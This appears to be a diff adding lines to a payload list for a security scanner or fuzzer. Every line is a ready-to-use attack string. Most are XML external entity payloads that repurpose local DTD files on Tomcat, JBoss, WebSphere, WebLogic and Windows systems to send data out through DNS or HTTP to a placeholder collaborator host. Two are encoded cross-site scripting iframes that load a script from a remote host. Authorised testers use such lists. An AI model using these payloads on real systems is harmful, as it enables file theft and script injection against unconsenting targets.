+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd\"\u003e \u003c!ENTITY % block \"xxx\" \u003e \u003c!ENTITY % common \u0027 \u003c!ENTITY \u0026#x25; file \"dns-exfil-25\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/docutils/docutils.dtd\"\u003e \u003c!ENTITY % measure \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-23.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/gtksourceview-4/language-specs/language.dtd\"\u003e \u003c!ENTITY % itemattrs \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-13.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/liteide/liteeditor/kate/language.dtd\"\u003e \u003c!ENTITY % commonAttributes \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-19.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\xwizard.dtd\"\u003e\u003c!ENTITY % onerrortypes \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-4.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\"\u003e \u003c!ENTITY % condition \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-9.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"\u003e \u003c!ENTITY % url.attribute.set \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-8.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/struts/struts-config_1_1.dtd\"\u003e \u003c!ENTITY % AttributeName \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-11.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Program Files (x86)\\Lotus\\Notes\\domino.dtd\"\u003e\u003c!ENTITY % boolean \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-3.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd\"\u003e \u003c!ENTITY % block \"xxx\" \u003e \u003c!ENTITY % common \u0027 \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-25.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"\u003e\u003c!ENTITY % URI \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-6\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"\u003e\u003c!ENTITY % URI \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-6.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd\"\u003e \u003c!ENTITY % AttributeName \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-12\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd\"\u003e \u003c!ENTITY % Boolean \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-7\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd\"\u003e \u003c!ENTITY % AttributeName \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-12.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd\"\u003e \u003c!ENTITY % Boolean \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-7.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;vps_ip:80&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;domain_collab&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd\"\u003e \u003c!ENTITY % queries \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-16\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd\"\u003e \u003c!ENTITY % publicIdentifier \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-17\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd\"\u003e \u003c!ENTITY % queries \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-16.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd\"\u003e \u003c!ENTITY % publicIdentifier \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-17.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
